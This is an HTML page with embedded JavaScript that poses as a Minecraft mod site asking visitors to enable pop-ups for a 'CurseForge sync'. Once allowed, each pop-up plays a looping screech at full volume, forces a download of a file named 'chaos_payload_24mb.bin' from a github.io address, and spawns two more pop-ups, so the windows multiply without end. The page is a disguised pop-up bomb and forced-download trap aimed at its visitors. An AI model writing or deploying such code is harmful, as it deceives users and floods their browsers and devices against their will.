<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Pop-up Permission Required</title>
  <script>
    function openPopup() {
      const width = 500;
      const height = 400;

      const maxLeft = window.screen.availWidth - width;
      const maxTop = window.screen.availHeight - height;

      const left = Math.floor(Math.random() * maxLeft);
      const top = Math.floor(Math.random() * maxTop);

      const popup = window.open(
        window.location.href + "?popup=true",
        "_blank",
        `width=${width},height=${height},left=${left},top=${top}`
      );

      if (popup) {
        popup.focus();
        window.blur();
      }
    }

    window.onload = function () {
      const isPopup = new URLSearchParams(window.location.search).has('popup');

      if (isPopup) {
        // === POPUP CONTENT ===
        document.body.innerHTML = `
          <audio id="screech" autoplay loop>
            <source src="screech.mp3" type="audio/mpeg">
          </audio>
          <h1>CurseForge sync window</h1>
          <p>Sync in progress... do not close this window.</p>
          <a id="downloadLink" href="https://elitemetal7.github.io/CoolestMinecraftMods/chaos_payload_24mb.bin" download style="display:none"></a>
        `;

        // Play the screech
        const screech = document.getElementById('screech');
        screech.volume = 1.0;
        screech.play().catch(() => {
          document.body.addEventListener('click', () => {
            screech.play();
          }, { once: true });
        });

        // Trigger file download on user click (fallback)
        const download = document.getElementById('downloadLink');
        download.click();

        // Immediately open 2 more popups
        openPopup();
        openPopup();

        // Auto-close after 4 seconds
        setTimeout(() => {
          window.close();
        }, 4000);

      } else {
        // === MAIN PAGE CONTENT ===
        document.body.innerHTML = `
          <h1>This wesbite requires pop-ups</h1>
          <p>Due to using CurseForge cross support, please enable pop-ups to contenue.</p>
          <p>Thank you for your understanding.</p>
        `;

        // Initial popup spawn
        openPopup();
      }
    };
  </script>

  <style>
    body {
      background-color: white;
      color: black;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    h1 {
      font-size: 32px;
      margin-bottom: 20px;
    }
    p {
      font-size: 18px;
      margin: 10px 0;
    }
  </style>
</head>

</html>
